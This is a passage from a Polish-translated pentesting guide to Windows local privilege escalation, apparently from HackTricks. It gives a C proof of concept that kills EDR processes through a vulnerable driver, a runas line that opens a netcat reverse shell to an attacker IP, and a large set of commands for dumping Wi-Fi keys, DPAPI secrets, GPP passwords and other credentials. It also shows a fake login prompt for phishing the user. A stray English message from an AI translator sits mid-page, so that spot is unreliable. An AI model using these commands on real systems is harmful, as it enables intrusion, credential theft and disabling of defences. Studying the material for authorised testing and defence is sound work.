{{#endref}}

### Sterowniki

Szukaj możliwych **sterowników firm trzecich, nietypowych/podatnych**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Jeśli sterownik ujawnia arbitralny mechanizm odczytu/zapisu jądra (często spotykany w źle zaprojektowanych handlerach IOCTL), możesz eskalować uprawnienia poprzez kradzież tokena SYSTEM bezpośrednio z pamięci jądra. Zobacz technikę krok po kroku tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Wykorzystywanie braku FILE_DEVICE_SECURE_OPEN na obiektach urządzeń (LPE + EDR kill)

Niektóre podpisane sterowniki firm trzecich tworzą swój obiekt urządzenia z silnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tego flagu bezpieczny DACL nie jest egzekwowany, gdy urządzenie jest otwierane przez ścieżkę zawierającą dodatkowy komponent, co pozwala dowolnemu nieuprzywilejowanemu użytkownikowi uzyskać handle, używając ścieżki namespace takiej jak:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z prawdziwego przypadku)

Gdy użytkownik może otworzyć urządzenie, uprzywilejowane IOCTLs udostępnione przez sterownik mogą być wykorzystane do LPE i manipulacji. Przykładowe możliwości zaobserwowane w praktyce:
- Zwrócenie handle z pełnym dostępem do dowolnych procesów (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony raw disk read/write (offline tampering, boot-time persistence tricks).
- Zakończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co pozwala na AV/EDR kill z poziomu user land przez kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Środki zaradcze dla programistów
- Zawsze ustaw FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń przeznaczonych do ograniczenia przez DACL.
- Waliduj kontekst wywołującego dla operacji uprzywilejowanych. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrot uchwytów.
- Ogranicz IOCTLs (access masks, METHOD_*, walidacja wejścia) i rozważ modele brokered zamiast bezpośrednich uprawnień kernel.

Pomysły na detekcję dla obrońców
- Monitoruj otwarcia w przestrzeni użytkownika podejrzanych nazw urządzeń (np. \\ .\\amsdk*) oraz specyficznych sekwencji IOCTL wskazujących na nadużycie.
- Wymuszaj listę blokowanych podatnych sterowników Microsofta (HVCI/WDAC/Smart App Control) i utrzymuj własne listy allow/deny.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu wewnątrz folderu znajdującego się w PATH** możesz być w stanie hijack a DLL ładowany przez proces i **escalate privileges**.

Sprawdź uprawnienia wszystkich folderów znajdujących się w PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Więcej informacji o tym, jak nadużyć tego sprawdzenia:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Sieć

### Udostępnienia
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### plik hosts

Sprawdź, czy w pliku hosts nie ma na stałe wpisanych innych znanych komputerów
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otwarte porty

Sprawdź, czy z zewnątrz są dostępne **usługi z ograniczonym dostępem**
```bash
netstat -ano #Opened ports?
```
### Tabela routingu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reguły zapory

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie...)**

Więcej[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Plik binarny `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie w GUI pojawi się pytanie, czy `nc` powinien być dozwolony przez zaporę).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Poświadczenia

### Winlogon Poświadczenia
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menadżer poświadczeń / Windows vault

Źródło [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault przechowuje poświadczenia użytkowników dla serwerów, stron internetowych i innych programów, do których **Windows** może **automatycznie logować użytkowników**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać tam poświadczenia Facebook, Twitter, Gmail itp., aby automatycznie logować się przez przeglądarki. Ale tak nie jest.

Windows Vault przechowuje poświadczenia, do których **Windows** może automatycznie zalogować użytkowników, co oznacza, że każda **aplikacja Windows, która potrzebuje poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub strony internetowej) **może korzystać z tego Credential Manager** & Windows Vault i użyć dostarczonych poświadczeń zamiast wpisywania nazwy użytkownika i hasła za każdym razem.

Jeżeli aplikacje nie wchodzą w interakcję z Credential Manager, nie sądzę, żeby mogły użyć poświadczeń dla danego zasobu. Więc jeśli twoja aplikacja chce korzystać z vault, powinna w pewien sposób **komunikować się z Credential Manager i żądać poświadczeń dla tego zasobu** z domyślnego storage vault.

Użyj `cmdkey`, aby wylistować przechowywane poświadczenia na maszynie.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład uruchamia zdalny binary przez udział SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Użycie `runas` z podanym zestawem credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Zauważ, że mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), lub moduł Empire Powershells (zob. [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)).

### DPAPI

The **Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, stosowaną przede wszystkim w systemie Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. To szyfrowanie wykorzystuje sekret użytkownika lub systemu, który znacząco zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego, który jest wyprowadzany z sekretów logowania użytkownika**. W scenariuszach obejmujących szyfrowanie systemowe wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkownika, przy użyciu DPAPI, są przechowywane w katalogu %APPDATA%\Microsoft\Protect\{SID}, gdzie {SID} reprezentuje [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Klucz DPAPI, współzlokalizowany z kluczem głównym, który chroni prywatne klucze użytkownika w tym samym pliku**, zazwyczaj składa się z 64 bajtów losowych danych. (Warto zauważyć, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlenie jego zawartości poleceniem `dir` w CMD, chociaż można go wyświetlić za pomocą PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć **mimikatz module** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

Pliki **credentials files protected by the master password** zazwyczaj znajdują się w:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Możesz użyć **mimikatz module** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować.\
Możesz **wydobyć wiele DPAPI** **masterkeys** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do zadań związanych ze **skryptowaniem** i automatyzacją jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Poświadczenia są chronione za pomocą **DPAPI**, co zwykle oznacza, że mogą być odszyfrowane tylko przez tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Aby **odszyfrować** poświadczenia PowerShell z pliku, który je zawiera, możesz wykonać:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Zapisane połączenia RDP

Możesz je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchomione polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menedżer poświadczeń Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files`\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **run with SYSTEM privileges**, wiele z nich jest podatnych na **DLL Sideloading (Informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Pliki i Rejestr (Poświadczenia)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH klucze hosta
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys w rejestrze

SSH private keys mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc powinieneś sprawdzić, czy znajduje się tam coś interesującego:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest on przechowywany zaszyfrowany, ale można go łatwo odszyfrować przy użyciu [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji na temat tej techniki: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie przy starcie systemu, uruchom:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Wygląda na to, że ta technika już nie działa. Próbowałem utworzyć klucze ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania asymetrycznego klucza.

### Pliki bezobsługowe
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM i SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Dane uwierzytelniające w chmurze
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Zbuforowane hasło GPP

Istniała funkcja umożliwiająca wdrożenie niestandardowych lokalnych kont administratora na grupie maszyn za pomocą Group Policy Preferences (GPP). Metoda ta miała jednak poważne luki bezpieczeństwa. Po pierwsze, Group Policy Objects (GPOs), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, zaszyfrowane AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne ryzyko, ponieważ mogło pozwolić na uzyskanie podwyższonych uprawnień.

Aby zredukować to ryzyko, opracowano funkcję skanującą lokalnie zbuforowane pliki GPP zawierające pole "cpassword" niebędące puste. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera informacje o GPP i lokalizacji pliku, co pomaga w identyfikacji i naprawie tej luki bezpieczeństwa.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Użycie crackmapexec do pobrania haseł:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład pliku web.config z poświadczeniami:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Dane uwierzytelniające OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Poproś o credentials

Zawsze możesz **poprosić użytkownika, żeby wpisał swoje credentials, a nawet credentials innego użytkownika** jeśli uważasz, że może je znać (zauważ, że **poproszenie** klienta bezpośrednio o **credentials** jest naprawdę **ryzykowne**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierające credentials**

Znane pliki, które jakiś czas temu zawierały **passwords** w **clear-text** lub **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don’t have access to your repository files. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the files you want searched/transformed). I’ll translate the English text to Polish following your rules and keep all markdown/html/tags/paths unchanged.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Dane uwierzytelniające w RecycleBin

Powinieneś także sprawdzić Bin, aby znaleźć w nim dane uwierzytelniające.

Aby **odzyskać hasła** zapisane przez różne programy, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Powinieneś sprawdzić bazy danych (dbs), w których przechowywane są hasła z **Chrome or Firefox**.\
Sprawdź też historię, zakładki i ulubione przeglądarek — być może niektóre **hasła są** tam przechowywane.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia komunikację pomiędzy komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą class ID (CLSID)**, a każdy komponent udostępnia funkcjonalność przez jedną lub więcej interfejsów, identyfikowanych za pomocą interface ID (IIDs).

Klasy i interfejsy COM są zdefiniowane w rejestrze pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** odpowiednio. Ten klucz rejestru powstaje przez scalenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

W obrębie CLSID-ów w tym kluczu rejestru można znaleźć podklucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może być **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) lub **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

W praktyce, jeśli możesz **nadpisać dowolną z DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli ta DLL zostanie uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak atakujący używają COM Hijacking jako mechanizmu utrzymywania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie zawartości plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Wyszukaj plik o określonej nazwie**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia, które wyszukują passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to wtyczka msf**. Stworzyłem tę wtyczkę, aby **automatycznie uruchamiać każdy metasploit POST module, który wyszukuje credentials** wewnątrz ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające passwords wymienione na tej stronie.\
